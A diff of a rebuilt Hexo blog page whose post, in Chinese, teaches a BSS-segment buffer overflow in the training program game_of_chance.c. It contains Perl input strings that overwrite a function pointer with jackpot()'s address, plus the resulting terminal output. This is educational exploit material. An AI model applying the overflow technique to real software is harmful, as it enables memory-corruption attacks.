@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <script>
     (function(){
         if(''){
@@ -28,8 +28,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -47,7 +47,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -81,23 +81,23 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-
-
-
-  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo">
 
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1">
 
 
 
@@ -105,12 +105,12 @@
 
 
 <meta name="description" content="12原文已发布至seebughttps://paper.seebug.org/548/ TL;DR 缓冲区溢出除了典型的栈溢出和堆溢出外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。wiki 测试环境ubuntu14.04X86.vul code snippet from game_of_chance.c 1234567891011// Custom u">
-<meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BSS段的溢出攻击">
 <meta property="og:url" content="http://kevien.github.io/2018/03/22/BSS段的溢出攻击/index.html">
-<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:site_name" content="M0rk&#39;s Blog">
 <meta property="og:description" content="12原文已发布至seebughttps://paper.seebug.org/548/ TL;DR 缓冲区溢出除了典型的栈溢出和堆溢出外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。wiki 测试环境ubuntu14.04X86.vul code snippet from game_of_chance.c 1234567891011// Custom u">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://kevien.github.io/2018/03/22/BSS段的溢出攻击/game.png">
 <meta property="og:image" content="http://kevien.github.io/2018/03/22/BSS段的溢出攻击/gamemain.png">
 <meta property="og:image" content="http://kevien.github.io/2018/03/22/BSS段的溢出攻击/distance.png">
@@ -149,7 +149,7 @@
 
 
 
-  <link rel="canonical" href="http://kevien.github.io/2018/03/22/BSS段的溢出攻击/"/>
+  <link rel="canonical" href="http://kevien.github.io/2018/03/22/BSS段的溢出攻击/">
 
 
 
@@ -158,7 +158,7 @@
   <title>BSS段的溢出攻击 | M0rk's Blog</title>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
 
@@ -183,13 +183,13 @@
   <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">M0rk's Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -219,7 +219,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -229,7 +229,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -239,7 +239,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -249,7 +249,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -259,7 +259,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -272,7 +272,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
             
             搜索
           </a>
@@ -293,9 +293,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -327,16 +325,16 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/03/22/BSS段的溢出攻击/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M0rk">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/uploads/avatar.jpg">
     </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="M0rk's Blog">
     </span>
 
@@ -430,26 +428,26 @@
       
 
       
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">原文已发布至seebug</div><div class="line">https://paper.seebug.org/548/</div></pre></td></tr></table></figure>
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原文已发布至seebug</span><br><span class="line">https://paper.seebug.org/548/</span><br></pre></td></tr></table></figure>
 <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
-<li>缓冲区溢出除了典型的<a href="https://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">栈溢出</a>和<a href="https://kevien.github.io/2017/10/28/堆溢出利用笔记/">堆溢出</a>外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。<a href="https://www.wikiwand.com/en/BSS" target="_blank" rel="external">wiki</a></li>
+<li>缓冲区溢出除了典型的<a href="https://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">栈溢出</a>和<a href="https://kevien.github.io/2017/10/28/堆溢出利用笔记/">堆溢出</a>外，还有一种发生在bss段上的，bss属于数据段的一种，通常用来保存未初始化的全局静态变量。<a href="https://www.wikiwand.com/en/BSS" target="_blank" rel="noopener">wiki</a></li>
 <li>测试环境ubuntu14.04X86.<h4 id="vul-code-snippet"><a href="#vul-code-snippet" class="headerlink" title="vul code snippet"></a>vul code snippet</h4></li>
 <li><p>from game_of_chance.c</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// Custom user struct to store information about users </div><div class="line">struct user &#123;</div><div class="line">    int uid;</div><div class="line">    int credits;</div><div class="line">    int highscore;</div><div class="line">    char name[100];</div><div class="line">    int (*current_game) ();</div><div class="line">&#125;;</div><div class="line"></div><div class="line">...</div><div class="line">struct user player;     // Player struct</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// Custom user struct to store information about users </span><br><span class="line">struct user &#123;</span><br><span class="line">    int uid;</span><br><span class="line">    int credits;</span><br><span class="line">    int highscore;</span><br><span class="line">    char name[100];</span><br><span class="line">    int (*current_game) ();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">struct user player;     // Player struct</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>其中game_of_chance 是如下图的一个小游戏<br><img src="/2018/03/22/BSS段的溢出攻击/game.png" alt=""></p>
 </li>
 <li><p>如上的代码片段中用一个函数指针保存了上次玩了哪个游戏，这个指针保存在user的结构体中，且被声明为全局变量，这意味着user这个结构体变量保存在bss数据段。其中结构体中固定为100字节的name变量保存了用户的姓名，且这个name是可以被input_name()这个函数所控制的，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">void input_name() &#123;</div><div class="line">   char *name_ptr, input_char=&apos;\n&apos;;</div><div class="line">   while(input_char == &apos;\n&apos;)    // Flush any leftover </div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // newline chars.</div><div class="line">   </div><div class="line">   name_ptr = (char *) &amp;(player.name); // name_ptr = player name&apos;s address</div><div class="line">   while(input_char != &apos;\n&apos;) &#123;  // Loop until newline.</div><div class="line">      *name_ptr = input_char;   // Put the input char into name field.</div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // Get the next char.</div><div class="line">      name_ptr++;               // Increment the name pointer.</div><div class="line">   &#125;</div><div class="line">   *name_ptr = 0;  // Terminate the string.</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void input_name() &#123;</span><br><span class="line">   char *name_ptr, input_char=&apos;\n&apos;;</span><br><span class="line">   while(input_char == &apos;\n&apos;)    // Flush any leftover </span><br><span class="line">      scanf(&quot;%c&quot;, &amp;input_char); // newline chars.</span><br><span class="line">   </span><br><span class="line">   name_ptr = (char *) &amp;(player.name); // name_ptr = player name&apos;s address</span><br><span class="line">   while(input_char != &apos;\n&apos;) &#123;  // Loop until newline.</span><br><span class="line">      *name_ptr = input_char;   // Put the input char into name field.</span><br><span class="line">      scanf(&quot;%c&quot;, &amp;input_char); // Get the next char.</span><br><span class="line">      name_ptr++;               // Increment the name pointer.</span><br><span class="line">   &#125;</span><br><span class="line">   *name_ptr = 0;  // Terminate the string.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>这个函数会接收用户输入的名字直到遇到换行符，所以这里并没有有效的限制用户输入，就意味着有可能被利用，此外我们覆盖之后还需要程序去调用这个函数指针，这个功能可以发生在下面代码的6、8或者10行以及play_the_game()函数中，代码片段如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">if((choice &lt; 1) || (choice &gt; 7))</div><div class="line">       printf(&quot;\n[!!] The number %d is an invalid selection.\n\n&quot;, choice);</div><div class="line">    else if (choice &lt; 4) &#123;  // Othewise, choice was a game of some sort.</div><div class="line">          if(choice != last_game) &#123; // If the function ptr isn&apos;t set</div><div class="line">             if(choice == 1)        // then point it at the selected game </div><div class="line">                player.current_game = pick_a_number;   </div><div class="line">             else if(choice == 2)                     </div><div class="line">                player.current_game = dealer_no_match;</div><div class="line">             else</div><div class="line">                player.current_game = find_the_ace;</div><div class="line">             last_game = choice;   // and set last_game.</div><div class="line">          &#125;</div><div class="line">          play_the_game();   // Play the game.</div><div class="line">       &#125;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if((choice &lt; 1) || (choice &gt; 7))</span><br><span class="line">       printf(&quot;\n[!!] The number %d is an invalid selection.\n\n&quot;, choice);</span><br><span class="line">    else if (choice &lt; 4) &#123;  // Othewise, choice was a game of some sort.</span><br><span class="line">          if(choice != last_game) &#123; // If the function ptr isn&apos;t set</span><br><span class="line">             if(choice == 1)        // then point it at the selected game </span><br><span class="line">                player.current_game = pick_a_number;   </span><br><span class="line">             else if(choice == 2)                     </span><br><span class="line">                player.current_game = dealer_no_match;</span><br><span class="line">             else</span><br><span class="line">                player.current_game = find_the_ace;</span><br><span class="line">             last_game = choice;   // and set last_game.</span><br><span class="line">          &#125;</span><br><span class="line">          play_the_game();   // Play the game.</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
 <li>如果last_game 未设置，函数指针current_game 会被指向成0或者-1，这时不会触发漏洞，后面last_game被设置成1，当修改完名字完成对current_game覆盖再玩游戏1的时候，进入play_the_game()函数,play_the_game()会有current_game指针变量的调用，此时漏洞即触发！<br><img src="/2018/03/22/BSS段的溢出攻击/gamemain.png" alt=""></li>
 <li>我们可以通过ctrl+z挂起当前的进程(这个时候last_game变量被设置成了1(因为刚才玩的是游戏choice是1))，我们找到可以被溢出的变量name，然后通过简单调试看一下name和current_game指针在内存中的位置关系。<br><img src="/2018/03/22/BSS段的溢出攻击/distance.png" alt=""></li>
-<li>如上图所示，正好是100个字节，通过以上我们可以进行如下的覆盖尝试<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;A&quot;x100 . &quot;BBBB&quot; . &quot;\n&quot;&apos;</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div></pre></td></tr></table></figure>
+<li>如上图所示，正好是100个字节，通过以上我们可以进行如下的覆盖尝试<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;A&quot;x100 . &quot;BBBB&quot; . &quot;\n&quot;&apos;</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2018/03/22/BSS段的溢出攻击/flowattempt.png" alt=""></p>
@@ -458,22 +456,22 @@
 <li>nm命令可以查看程序的符号表，来看一下程序有哪些函数以及其对应的内存地址（此思路常用于破解）。<br><img src="/2018/03/22/BSS段的溢出攻击/jackpot.png" alt=""></li>
 <li>jackpot函数是我们理想的目标，这个函数用来给我们增加”金币”,所以当current_game函数指针被覆盖成这个函数的时候，我们就可以拥有无数”金币”</li>
 <li><p>这个程序通过标准输入进行用户交互，我们完全可以使用脚本实现自动化，如下的例子将会自动选择游戏1，然后猜测数字7，当被问是否还玩的时候选择no，最后通过选择7退出程序。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n7\nn\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;print &quot;1\n7\nn\n7\n&quot;&apos; | ./game_of_chance</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>同样的技巧可以用到自动化exploit中，下面的命令会完成修改用户名为100个A加jackpot()的地址，这个时候就覆盖掉了current_game的地址，然后当再次选择我们要玩的游戏的后，jackpot()函数就会被调用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&apos; | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 90 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 11</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 80 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048ca5</div><div class="line">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</div><div class="line">You have won the jackpot of 100 credits!</div><div class="line"></div><div class="line">You now have 180 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 180 credits] -&gt;  </div><div class="line">Thanks for playing! Bye.</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&apos; | ./game_of_chance </span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 90 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0x08048f15</span><br><span class="line"></span><br><span class="line">####### Pick a Number ######</span><br><span class="line">This game costs 10 credits to play. Simply pick a number</span><br><span class="line">between 1 and 20, and if you pick the winning number, you</span><br><span class="line">will win the jackpot of 100 credits!</span><br><span class="line"></span><br><span class="line">10 credits have been deducted from your account.</span><br><span class="line">Pick a number between 1 and 20: The winning number is 11</span><br><span class="line">Sorry, you didn&apos;t win.</span><br><span class="line"></span><br><span class="line">You now have 80 credits</span><br><span class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: M0rk]</span><br><span class="line">[You have 80 credits] -&gt;  </span><br><span class="line">Change user name</span><br><span class="line">Enter your new name: Your name has been changed.</span><br><span class="line"></span><br><span class="line">-=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</span><br><span class="line">[You have 80 credits] -&gt;  </span><br><span class="line">[DEBUG] current_game pointer @ 0x08048ca5</span><br><span class="line">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</span><br><span class="line">You have won the jackpot of 100 credits!</span><br><span class="line"></span><br><span class="line">You now have 180 credits</span><br><span class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</span><br><span class="line">1 - Play the Pick a Number game</span><br><span class="line">2 - Play the No Match Dealer game</span><br><span class="line">3 - Play the Find the Ace game</span><br><span class="line">4 - View current high score</span><br><span class="line">5 - Change your user name</span><br><span class="line">6 - Reset your account at 100 credits</span><br><span class="line">7 - Quit</span><br><span class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</span><br><span class="line">[You have 180 credits] -&gt;  </span><br><span class="line">Thanks for playing! Bye.</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>可以看到函数被调用我们增加了100金币</p>
 </li>
-<li>因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\n&quot; .&quot;y\n&quot;x10.  &quot;n\n5\nM0rk\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
+<li>因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\n&quot; .&quot;y\n&quot;x10.  &quot;n\n5\nM0rk\n7\n&quot;&apos; | ./game_of_chance</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2018/03/22/BSS段的溢出攻击/getall.png" alt=""></p>
 <ul>
